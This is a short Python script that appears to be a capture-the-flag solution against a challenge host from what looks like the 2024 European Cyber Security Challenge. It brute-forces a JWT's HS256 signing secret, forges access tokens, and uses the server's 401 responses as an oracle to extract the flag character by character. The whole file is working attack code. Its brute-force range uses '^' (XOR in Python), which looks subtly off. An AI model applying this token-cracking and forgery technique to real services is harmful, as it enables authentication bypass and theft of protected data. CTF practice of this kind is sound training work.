import jwt
import requests
import string

flag = ""
curr = "ecs"
secret = ""

original_token = requests.get("https://nwaf.ecsc24.hack.cert.pl/login", allow_redirects=False).cookies.get("access_token_cookie")
for i in range(2 ^ 127, 2 ^ 128 + 1):
  try:
    secret = i.to_bytes(16, 'big')
    jwt.decode(original_token, secret, algorithms=["HS256"])
    print(f"secret found: {secret=}")
    break
  except:
    continue
else:
  print("secret not found.")
  exit(1)

while not curr.endswith("}"):
  for x in "{}_" + string.digits + string.ascii_letters + "!@#$%^&*()":
    token = jwt.encode({
      "sub": curr + x,
      "exp": 2219586395,
    }, secret, algorithm="HS256")

    req = requests.get("https://nwaf.ecsc24.hack.cert.pl/hello", cookies={
      "access_token_cookie": token
    })

    if req.status_code == 401:
      print(f"letter: {x=}, {curr=}")
      flag += curr[0]
      curr = curr[1:] + x
      break
  else:
    print("letter not found.")
    print(f"{flag=}, {curr=}")
    exit(1)

flag += curr
print(f"{flag=}")
